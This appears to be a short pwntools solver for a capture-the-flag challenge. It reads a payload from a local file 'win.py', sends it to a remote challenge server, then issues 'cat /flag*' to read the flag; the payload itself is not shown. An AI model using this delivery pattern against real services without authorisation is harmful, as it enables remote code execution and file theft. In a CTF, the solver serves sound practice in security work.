from pwn import *

with open("win.py", "rb") as f:
    code = f.read()

code = code.replace(b"\n", b"\r")

#p = remote("localhost", 6741)
p = remote("build-a-builtin-revenge.opus4-7.b01le.rs", 8443, ssl=True)

p.sendlineafter(b"> ", code)
time.sleep(1)
p.sendline(b"cat /flag*; echo")

flag = p.recvline().strip().decode()

print(f"{flag = }")
p.close()
